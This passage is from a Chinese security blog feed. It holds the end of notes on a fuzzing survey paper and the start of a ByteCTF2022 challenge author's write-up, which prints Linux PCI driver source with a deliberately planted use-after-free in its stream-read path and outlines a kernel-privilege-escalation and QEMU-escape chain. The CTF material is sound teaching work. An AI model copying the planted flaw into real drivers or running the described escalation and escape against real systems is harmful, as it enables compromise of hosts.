Bugs）在程序没有合适的同步机制或运行顺序时发生，通常可以分为：</p><ul><li><strong>死锁型漏洞</strong>（deadlock bugs）：等待资源释放（如锁）</li><li><strong>非死锁型漏洞</strong>（non-deadlock bugs）<ul><li>原子性损坏型（atomicity-violation）：破坏了某一代码区域的 <em>期望序列性</em> （desired serializability），如 Fig.8a 所示的 <code>Thread 1</code> 第三行释放了 <code>p-&gt;info</code>，<code>Thread 2</code> 的第二行将 <code>p-&gt;info</code> 置为 NULL，从而引发错误</li><li>顺序型（order）漏洞：以错误的顺序对内存区域进行访问，如 Fig.8b 中 <code>Thread 2</code> 在 <code>mThd</code> 被初始化前对 <code>mState</code> 赋值，这会造成未初始化变量引用漏洞</li></ul></li></ul><blockquote><p><s>真的有人会这么写代码🐎</s></p></blockquote><p><img src="https://s2.loli.net/2022/10/30/AfHSLXUPDItFRqB.png" alt="image.png"></p><p>发现死锁漏洞的一个方法是在 <em>锁顺序图</em> （lock order graph）上检测代表死锁的环（cycles）</p><blockquote><p>论文举了这些例子：</p><ul><li><a href="https://ieeexplore.ieee.org/document/6227156/">MagicFuzzer</a>： 为了提高效率，其会移除不在任何环中的锁，并检查剩余的环</li><li><a href="https://dl.acm.org/doi/abs/10.1145/1453101.1453121">ATOMFUZZER</a>：对于原子性破坏，其会观测原子块内的锁被两个线程重复请求与释放的漏洞模式</li><li><a href="https://dl.acm.org/doi/10.1145/1321631.1321679">CalFuzzer</a>：过多的线程交错（interleaving）带来状态爆炸（state-explosion），其基于交错的等价性缓解状态爆炸</li></ul></blockquote><h3 id="5-2-3-Algorithmic-Complexity">5.2.3 Algorithmic Complexity</h3><p><strong>算法复杂性</strong>（Algorithm Complexity，AC）漏洞是算法在最坏情况下会显著的降低性能，从而可能导致拒绝服务（Denial-of-Service）攻击，Fig.9 展示了一个有着不同算法复杂度的例子，在最坏情况下可以被攻击者用作 DoS  攻击：</p><p><img src="https://s2.loli.net/2022/10/30/mYhDVBvyeSzcrix.png" alt="Fig. 9. Algorithm complexity"></p><blockquote><p>论文举了以下例子：</p><ul><li><a href="https://dl.acm.org/doi/10.1145/3133956.3134073">SlowFuzz</a>：通过生成增加执行指令数量的输入来发现 AC 漏洞</li><li><a href="https://www.ndss-symposium.org/ndss-paper/hotfuzz-discovering-algorithmic-denial-of-service-vulnerabilities-through-guided-micro-fuzzing/">HotFuzz</a>：通过最大化单个方法的消耗来检测 Java 中的 AC 漏洞</li><li><a href="https://ieeexplore.ieee.org/document/9284141/">MemLock</a>：通过边覆盖率与内存消耗来检测 AC 漏洞</li><li><a href="https://dl.acm.org/doi/10.1145/3236024.3236039">Singularity</a>：基于 <em>最坏表现输入</em> （我认识他 performance input，WPI）总是遵循某种特定模式来合成输入生成程序</li></ul></blockquote><h3 id="5-2-4-Spectre-type-Bugs">5.2.4 Spectre-type Bugs</h3><p><strong>幽灵型漏洞</strong>（Spectre-type Bugs）是一种利用错误分支预测（mispredicted branch speculations）来控制内存访问的微架构攻击，例如在 Fig.10 中攻击者可以利用有效值来训练分支预测为真，随后给变量一个 OOB 的值，此时预测器便会错误预测分支行为，从而错误地执行了第3、4行代码，造成了越界读取</p><p><img src="https://s2.loli.net/2022/10/30/LJsx8WOUQyP2koA.png" alt="Fig. 10. Spectre-type bug"></p><blockquote><p>论文给出了这个例子：<a href="https://www.usenix.org/conference/usenixsecurity20/presentation/oleksenko">SpecFuzz</a>，<s>不过在笔者看来噱头大于实际</s></p></blockquote><h3 id="5-2-5-Side-channels">5.2.5 Side channels</h3><p><strong>侧信道漏洞</strong>（side-channel）通过对系统的非功能性表现（例如执行时间）来泄露信息，例如通过分支执行时间判断执行的分支</p><blockquote><p>论文没给例子，那笔者给出一个例子：<a href="https://gruss.cc/files/prefetch.pdf">prefetch side-channel attack: bypassing SMAP and KASLR</a></p></blockquote><p><strong>JIT-induced side channels</strong>（<s>不懂咋翻</s>）是一种由即时优化（Just-In-Time Optimization）导致的特殊侧信道，类似于幽灵型漏洞，通过训练 JIT 编译器优化单一分支以使得两执行分支间执行时间差大到可以被观测到</p><h3 id="5-2-6-Integer-Bugs">5.2.6 Integer Bugs</h3><p><strong>整型上溢/下溢</strong>（Integer Overflow/Underflow）在算术表达式的值超过机器类型所决定的范围时发生，或是在整型间转换时发生（比如 int to uint）</p><blockquote><p>论文举了这个例子：<a href="https://dl.acm.org/doi/10.5555/1855768.1855773">SmartFuzz</a></p></blockquote><h2 id="5-3-Improvement-of-Execution-Speed">5.3 Improvement of Execution Speed</h2><p>执行速度对模糊测试而言非常关键，更高的执行速度意味着在同一时间能跑更多测试用例，从而提高发现缺陷的机会</p><h3 id="5-3-1-Binary-Analysis">5.3.1 Binary Analysis</h3><p><strong>静态插桩</strong>（static instrumentation）是主流的获取执行状态的方式，因为其为 fuzzing 提供了更高的执行速度</p><ul><li><p>对开源程序而言，一个被广泛使用的静态分析工具是 <code>LLVM</code>，其在编译期进行插桩</p></li><li><p>对于闭源程序而言，fuzzer 被限制于二进制分析，但二进制插桩工具有着不菲的运行时开销</p><blockquote><p>论文给出了这些例子：</p><ul><li><a href="https://ieeexplore.ieee.org/document/9152762">RetroWrite</a> 使用基于可重汇编的汇编（reassembleable assembly）的静态二进制重写技术，其关注于使用 64 位的 <em>地址无关代码</em> （position independent code，PIC）的重定位信息来插桩汇编程序</li><li><a href="https://www.usenix.org/conference/usenixsecurity21/presentation/nagy">FIBRE</a> 通过四个修改中间表示的阶段（IR-modifying phase）来流水线化插桩</li><li><a href="https://ieeexplore.ieee.org/document/9519407">STOCHFUZZ</a> 通过多次重写来解决此前重写的遗留问题</li></ul></blockquote></li></ul><h3 id="5-3-2-Execution-Process">5.3.2 Execution Process</h3><p>执行速度同样可以在模糊测试过程中提升，例如 <a href="https://ieeexplore.ieee.org/document/8835316">UnTracer</a> 观测到大部分测试用例并不会带来新的覆盖率，由此其仅追踪会增加覆盖率的测试用例</p><blockquote><p>论文还给出这些例子：</p><ul><li><a href="https://ieeexplore.ieee.org/document/9139349/">CSI-Fuzz</a> 使用边覆盖率来改进 UnTracer，因为块覆盖率丧失了执行状态信息</li><li><a href="https://ieeexplore.ieee.org/document/9286017">Zeror</a> 通过在 UnTracer  插桩与 AFL 插桩间切换来改进 UnTracer</li></ul></blockquote><p>对于混合模糊测试，混合执行被用以求解路径约束，但符号执行在表示路径约束上较慢，<a href="">QSYM</a> 通过移除一些耗时的内容（IR 翻译、快照等）来缓解性能瓶颈</p><blockquote><p>论文还给出这些例子：</p><ul><li><a href="https://dl.acm.org/doi/10.1145/3319535.3354249">Intriguer</a> 观测到 QSYM 仍求解不必要约束导致的性能评价，因此其使用符号执行由动态污点分析确认的更相关指令</li><li><a href="https://dl.acm.org/doi/10.1145/3133956.3134046">Xu</a> 发现 AFL 在并行跑 120 核时显著变慢，故其设计了新的操作原语（operating primitives）来提升执行速度</li></ul></blockquote><h3 id="5-3-3-Various-Applications">5.3.3 Various Applications</h3><p>模糊测试被用以检测多种目标中的缺陷，如 IoT、OS kernel、VMM 等，需要根据目标特性进行客制化</p><blockquote><p>论文给出这些例子：</p><ul><li><a href="https://www.usenix.org/conference/usenixsecurity19/presentation/zheng">FIRM-AFL</a> 通过结合用户态模拟与全系统模拟来缓解传统 IOT 固件 fuzzing 中全系统模拟带来的虚拟地址与内存访问间翻译及模拟系统调用的开销</li><li>Schumilo 设计了一种<a href="https://www.ndss-symposium.org/ndss-paper/hyper-cube-high-dimensional-hypervisor-fuzzing/">客制化 OS</a> 与<a href="https://www.usenix.org/conference/usenixsecurity21/presentation/schumilo">快速快照存储机制</a></li><li>。。。</li></ul></blockquote><blockquote><p><strong>Gap 3</strong>：对应用的自动化执行基于对其的深入理解，在设计自动记录安全缺陷的 indicators 时需要首先研究这些缺陷的特性</p></blockquote><h1>0x06. DIRECTIONS OF FUTURE RESEARCH</h1><p>本节总结了 fuzzing 未来的研究方向</p><ul><li><strong>More sensitive fitness</strong>：研究人员意识到代码覆盖在发现复杂漏洞上存在局限性，因此其通过引入由分析漏洞获得的信息来改进代码覆盖。未来的工作可以是基于漏洞特性分析与检测漏洞，尤其是分析那些 fuzzing 未分析出的漏洞</li><li><strong>More sophisticated fuzzing theory</strong>：绝大部分现有的工作都致力于种子调度上，仅少部分工作关注于 fuzzing 的其他过程。对整个模糊测试过程进行数学化构建并非小事，但构建多余一个模糊测试过程是可能的，例如 Game Theory 便同时考虑了种子调度与字节调度。一个更大的图景是关于模糊测试的理论局限（例如灰盒模糊测试的局限）。另一方面，使用多种类型的 fitness 构建 fuzzing 过程是另一种创建更先进 fuzzing 理论的方式，例如未来的工作可能构建同时考虑漏洞出现与状态转移的 fuzzing 过程</li><li><strong>Sound evaluation</strong>：一部分工作关注于评估的可靠性（soundness of evaluation），但没有明确结论（§3.6），有更多的问题待我们解答：在评估语料库中该使用真实漏洞还是合成漏洞？静态测试是区分不同 fuzzing 技术的最终答案🐎？合理的 time budget 应当是？如何在没有其他可比较 fuzzer 的情况下评估特殊目标（如硬件）？</li><li><strong>Scalable input inference</strong>：若在 fuzzing 中能使用格式或数据依赖项则能显著提高 fuzzing 效率（§4.6&amp;§4.7），静态分析被广泛用于格式与数据依赖项推断，但其特定于特定程序，而推断方案的实现需要考虑不同应用的特性。动态分析关注于格式推断，仅少部分在数据依赖项推断上做了工作，而其比静态分析更可扩展（scalable）</li><li><strong>Efficient mutation operators</strong>：几乎所有 fuzzer 都在 fuzzing 中使用混合的变异器，但在 fuzzing 中并不会修改变异器（§4），一部分工作在优化变异器调度上，但没人关注于可变的变异器（§3.4）。由于变异器调度与字节调度紧密关联，可以考虑基于字节调度设计变异器。对高度结构化输入的变异器调度也值得研究</li><li><strong>More types of applications</strong>：由于应用的复杂性，fuzzing 在检测更多类型应用上有其局限，例如一部分工作探索了 fuzz CPSs 的可能性，但能力遭到了限制。由于执行速度对 fuzzing 而言很重要，因此对于难以被 fuzz 的程序而言，一个潜在的方向是提升他们的执行速度</li><li><strong>More types of bugs</strong>：fuzzing 在检测如内存破坏、并发漏洞、算法复杂性漏洞上取得良好成果（§5.2），但在检测其他类型漏洞（如权限提升或逻辑漏洞）上仍存在困难，难点在于如何设计合适的 indicator，这需要研究人员同时对 fuzzing 与目标漏洞有着深刻理解</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;模糊测试为什么是神&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="http://blog.arttnba3.cn/categories/PAPER/"/>
    
    
    <category term="信息安全" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="FUZZ" scheme="http://blog.arttnba3.cn/tags/FUZZ/"/>
    
    <category term="论文笔记" scheme="http://blog.arttnba3.cn/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>【CTF.0x07】ByteCTF2022 byte_run 出题手记</title>
    <link href="http://blog.arttnba3.cn/2022/09/30/CTF-0X07-BYTECTF2022_BYTERUN/"/>
    <id>http://blog.arttnba3.cn/2022/09/30/CTF-0X07-BYTECTF2022_BYTERUN/</id>
    <published>2022-09-30T15:48:01.000Z</published>
    <updated>2022-11-23T18:45:06.334Z</updated>
    
    <content type="html"><![CDATA[<p>前年👴当选手的时候还有⑤⭐级的带🏨住，今年当出题人👴只能喝西北风</p><span id="more"></span><h1>0x00.一切开始之前</h1><p>作为一名安全研究员，笔者不知道为什么进了字节跳动当开发，于是就不知道为什么又跑去帮 ByteCTF 出题了（笑）</p><p>其实这道题最初的灵感来自于 Google CTF 2021 的一道名为 “fullchain” 的题目，那是一道 chrome v8 + mojo sandbox escape + kernel primitive 的题目，<strong>一条非常完整的利用链，笔者觉得非常帅气</strong>（笑）</p><p>笔者也一直想出一道比较「完整」（full chain）的题目，不过限于自身技术水平较低的缘故再加上这一次的出题时间比较短，于是只弄好了“后端利用”的部分——「Linux kernel提权」 + 「QEMU逃逸」</p><blockquote><p>“后端利用”是笔者临时生造的词，仅在这篇文章的开头表示「拿到了远端代码执行权限之后的利用部分」（笑）</p></blockquote><ul><li>kernel 部分的灵感来自于 CVE-2022-0847，也就是“dirty pipe”，笔者模仿内核的 pipe 结构自己写了一个简化版的 pipe，并留下了一个 UAF 漏洞</li><li>QEMU 部分则主要是一个提供存储功能的“块设备”，漏洞则是非常明显的整数溢出导致的越界读写</li></ul><p>在笔者看来整体难度其实并不算太大（因为当笔者开始出这道题目的时候出题时间已经所剩无几了，那时候其实没想出啥好的点子XD），所以在其他出题人都在文档里写“难度中等”的时候只有笔者一个人写了“难度简单”，从最终的解题情况来看的话 <em>这一次整个 pwn 的出题好像都不咋能吸引大佬来做…</em></p><p>本次题目源码已经全部开源：<a href="https://github.com/arttnba3/ByteCTF2022_PWN-ByteRun">https://github.com/arttnba3/ByteCTF2022_PWN-ByteRun</a></p><h1>0x01.题目分析</h1><p>u1s1，这一次编译出来的代码再反汇编之后确实比较难看，哪怕是笔者作为出题人尝试逆了一下也没能在短时间内看明白整个题目的运行逻辑（笑）</p><h2 id="一、内核模块部分">一、内核模块部分</h2><p>笔者一开始就想写一个功能上比较完整的设备驱动，于是包括与设备交互那一块的代码也集成在了内核模块中，不过在这里笔者设定了驱动存在着两种运行模式：流（stream）模式和块（block）模式，其中前者是与设备无关的管道功能部分，后者则是与设备交互的部分，但是后者的功能需要 root 权限才能开启，于是第一个任务就是内核提权；）</p><p>在模块初始化函数当中为 PCI 设备进行了相应的接口注册：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">bytedev_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-comment">/* register pci driver */</span><br>    <span class="hljs-keyword">return</span> pci_register_driver(&amp;bytedev_driver);<br>&#125;<br></code></pre></td></tr></table></figure><p>当一个新的 bytedev 设备插进来的时候，内核便会遍历接口比对 BTF，最后调用到我们的初始化函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_device_id</span> <span class="hljs-title">bytedev_ids</span>[] =</span> &#123;<br>    &#123; PCI_DEVICE(PCI_VENDOR_ID_BYTEDEV, PCI_DEVICE_ID_BYTEDEV) &#125;,<br>    &#123; <span class="hljs-number">0</span>, &#125;,<br>&#125;;<br><br>MODULE_DEVICE_TABLE(pci, bytedev_ids);<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_driver</span> <span class="hljs-title">bytedev_driver</span> =</span> &#123;<br>    .name       = <span class="hljs-string">&quot;bytedev&quot;</span>,<br>    .id_table   = bytedev_ids,<br>    .probe      = bytedev_pci_probe,<br>    .remove     = bytedev_pci_remove,<br>&#125;;<br></code></pre></td></tr></table></figure><p>对于每个插上来的 bytedev 类型的设备，驱动都会动态生成一个对应的结构 <code>bytedev</code>，并使用 <code>pci_request_regions()</code> 等函数进行资源的探测与占用，从而使得<strong>无法直接通过在用户态进程打开设备资源文件的方式与设备进行交互</strong>：</p><blockquote><p>其实可以通过提权后卸载内核模块的方式来重新实现直接通过设备资源文件与设备进行交互，但实际上在内核模块当中笔者早已封装好了所需要使用的接口（笑）</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bytedev_pci_probe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pci_dev *pdev,</span><br><span class="hljs-params">                            <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> pci_device_id *id)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev</span> *<span class="hljs-title">bdev</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span>   *<span class="hljs-title">dev_node</span>;</span><br>    <span class="hljs-type">char</span> dname[BYTEDEV_DEVNAME_LENGTH];<br>    <span class="hljs-type">int</span> minor_num;<br>    <span class="hljs-type">int</span> err;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[bytedev:] ByteDance pci device detected!&quot;</span>);<br><br>    <span class="hljs-comment">/* alloc space for bytedev struct*/</span><br>    <span class="hljs-keyword">if</span> (!(bdev = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> bytedev), GFP_KERNEL))) &#123;<br>        err = -ENOMEM;<br>        <span class="hljs-keyword">goto</span> err_no_mem;<br>    &#125;<br><br>    pci_set_drvdata(pdev, bdev);<br><br>    <span class="hljs-comment">/* enable the device */</span><br>    <span class="hljs-keyword">if</span> ((err = pci_enable_device(pdev))) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] Cannot enable PCI device, abort.&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_out_free_dev;<br>&#125;<br><br>    <span class="hljs-comment">/* check for MMIO flags on BAR 0 */</span><br>    <span class="hljs-keyword">if</span> (!(pci_resource_flags(pdev, <span class="hljs-number">0</span>) &amp; IORESOURCE_MEM)) &#123;<br>        printk(KERN_ERR <br>            <span class="hljs-string">&quot;[bytedev:] Cannot find PCI device base address for MMIO, abort.&quot;</span>);<br>        err = -ENODEV;<br>        <span class="hljs-keyword">goto</span> err_out_disable_pdev;<br>    &#125;<br><br>    <span class="hljs-comment">/* check for PMIO flags on BAR 1 */</span><br>    <span class="hljs-keyword">if</span> (!(pci_resource_flags(pdev, <span class="hljs-number">1</span>) &amp; IORESOURCE_IO)) &#123;<br>        printk(KERN_ERR <br>            <span class="hljs-string">&quot;[bytedev:] Cannot find PCI device base address for PMIO, abort.&quot;</span>);<br>        err = -ENODEV;<br>        <span class="hljs-keyword">goto</span> err_out_disable_pdev;<br>    &#125;<br><br>    <span class="hljs-comment">/* request for PCI bar spaces */</span><br>    <span class="hljs-keyword">if</span> ((err = pci_request_regions(pdev, DRV_NAME))) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;Cannot obtain PCI resources, abort.&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_out_disable_pdev;<br>    &#125;<br><br>    <span class="hljs-comment">/* iomap for mmio space */</span><br>    bdev-&gt;mmio_addr = pci_ioremap_bar(pdev, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!bdev-&gt;mmio_addr) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;Cannot ioremap for MMIO space, abort.&quot;</span>);<br>        err = -ENOMEM;<br>        <span class="hljs-keyword">goto</span> err_out_free_region;<br>    &#125;<br><br>    <span class="hljs-comment">/* get I/O ports base */</span><br>    bdev-&gt;io_base = pci_resource_start(pdev, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">/* register device node */</span><br>    minor_num = bytedev_get_unused_minor_num();<br><br>    <span class="hljs-keyword">if</span> (minor_num &lt; <span class="hljs-number">0</span>) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] bytedev amount limits!&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_out_iounmap_mmio;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (minor_num == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">snprintf</span>(dname, <span class="hljs-keyword">sizeof</span>(dname), <span class="hljs-string">&quot;%s&quot;</span>, DEVICE_NAME);<br>    &#125; <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">snprintf</span>(dname, <span class="hljs-keyword">sizeof</span>(dname), <span class="hljs-string">&quot;%s%d&quot;</span>, DEVICE_NAME, minor_num);<br>    &#125;<br><br>    dev_node = device_create(bytedev_class, <span class="hljs-literal">NULL</span>, <br>                            MKDEV(bytedev_major_num, minor_num), <br>                            <span class="hljs-literal">NULL</span>, dname);<br>    <span class="hljs-keyword">if</span> (IS_ERR(dev_node)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] Failed to create the device!&quot;</span>);<br>        err = PTR_ERR(dev_node);<br>        <span class="hljs-keyword">goto</span> err_out_unuse_minor;<br>    &#125;<br><br>    <span class="hljs-comment">/* other data init */</span><br>    spin_lock_init(&amp;bdev-&gt;dev_lock);<br>    <span class="hljs-built_in">memset</span>(bdev-&gt;data_queue, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">void</span>*) * BYTEDEV_MAX_BUFS);<br>    bdev-&gt;head_idx = <span class="hljs-number">0</span>;<br>    bdev-&gt;tail_idx = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* info records */</span><br>    bdev-&gt;pdev = pdev;<br>    bdev-&gt;dev_node = dev_node;<br>    bdev-&gt;minor_num = minor_num;<br>    bytedev_arr[minor_num] = bdev;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[bytedev:] bytedev%d register complete.&quot;</span>, minor_num);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>err_out_unuse_minor:<br>    bytedev_set_unused_minor_num(minor_num);<br>err_out_iounmap_mmio:<br>    pci_iounmap(pdev, bdev-&gt;mmio_addr);<br>err_out_free_region:<br>    pci_release_regions(pdev);<br>err_out_disable_pdev:<br>    pci_disable_device(pdev);<br>err_out_free_dev:<br>    kfree(bdev);<br>err_no_mem:<br>    <span class="hljs-keyword">return</span> err;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中 <code>bytedev</code> 结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span>   *<span class="hljs-title">dev_node</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_dev</span>  *<span class="hljs-title">pdev</span>;</span><br>    <span class="hljs-type">int</span> minor_num;<br>    u64 __iomem  *mmio_addr;<br>    u64 io_base;<br><br>    <span class="hljs-type">spinlock_t</span> dev_lock;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> *<span class="hljs-title">data_queue</span>[<span class="hljs-title">BYTEDEV_MAX_BUFS</span>];</span><br>    <span class="hljs-type">int</span> head_idx, tail_idx;<br>&#125;;<br></code></pre></td></tr></table></figure><p>对于流模式而言，其使用一个环形队列 <code>data_queue</code> 来实现进程间的数据传递，我们可以直接通过读写设备文件来实现对环形队列的数据读写，其本质上是一个如下结构的指针数组：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> len, offset;<br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><p>第一个漏洞便存在于读的过程当中，在读的过程中存在一个 UAF 漏洞，从而导致读取完数据后对应的 buffer 并没有被释放，但是在正常地对该功能的使用上并不会造成影响，因为 slub allocator 并不似 ptmalloc 那样恒定使用前 8 字节来存放 next free object，这使得其统计数据字段得以保留</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">bytedev_stream_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *f, </span><br><span class="hljs-params">                            <span class="hljs-type">char</span> __user *buf, </span><br><span class="hljs-params">                            <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                            <span class="hljs-type">loff_t</span> *loff)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev</span> *<span class="hljs-title">dev</span> =</span> f-&gt;private_data;<br>    <span class="hljs-type">ssize_t</span> ret;<br>    <span class="hljs-type">ssize_t</span> rlen = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (bytedev_queue_empty(dev)) &#123;<br>        ret = -EFAULT;<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (size &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> *<span class="hljs-title">d</span>;</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> left, clen;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * If the data queue is already empty,</span><br><span class="hljs-comment">         * just quit out is OK.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">if</span> (bytedev_queue_empty(dev)) &#123;<br>            ret = rlen;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br><br>        d = dev-&gt;data_queue[dev-&gt;head_idx];<br>        left = d-&gt;len - d-&gt;offset;<br>        clen = left 